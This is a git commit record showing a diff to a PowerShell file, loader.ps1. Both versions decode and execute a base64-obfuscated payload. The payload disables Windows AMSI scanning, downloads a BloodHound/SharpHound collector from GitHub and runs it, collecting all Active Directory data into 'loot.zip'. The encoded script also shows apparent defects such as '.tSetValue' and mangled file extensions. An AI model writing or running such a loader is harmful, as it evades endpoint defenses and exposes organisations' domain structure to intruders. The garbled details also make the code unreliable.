b5321d2985a91bbb71dd38f0fba74e61b110495b
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:10:58 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,10 +1,4 @@
-$encoded = @"
-W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgic3lzdGVtLm1hbmFnZW1lbnQuYXV0b21hdGlvbi5hbXNpdXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikud
-FNldFZhbHVlKCRudWxsLHRydWU7CklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NwZWN0ZXJP
-cHMvQmxvb2RIb3VuZC1MZWdhY3kvbWFzdGVyL0NvbGxlY3RvcnMvU2hhcnBIb3VuZC5wc2MiKTsKSW52b2tlLUJsb29kSG91bmQgLUNvbGxlY3Rpb25NZXRob2QgQWxsIC1a
-aXBGaWxlTmFtZSBsb290LnppcA==
-"@ -replace "`r|`n", ""
+$b64 = 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgic3lzdGVtLm1hbmFnZW1lbnQuYXV0b21hdGlvbi5hbXNpdXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikudFNldFZhbHVlKCRudWxsLHRydWUpCklFWCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TcGVjdGVyT3BzL0Jsb29kSG91bmQtTGVnYWN5L21hc3Rlci9Db2xsZWN0b3JzL1NoYXJwSG91bmQucHNxJykKSW52b2tlLUJsb29kSG91bmQgLUNvbGxlY3Rpb25NZXRob2QgQWxsIC1aaXBGaWxlTmFtZSBsb290LnppcA=='
 
-$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
-$sb = [ScriptBlock]::Create($decoded)
-& $sb
+$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+Invoke-Expression $payload
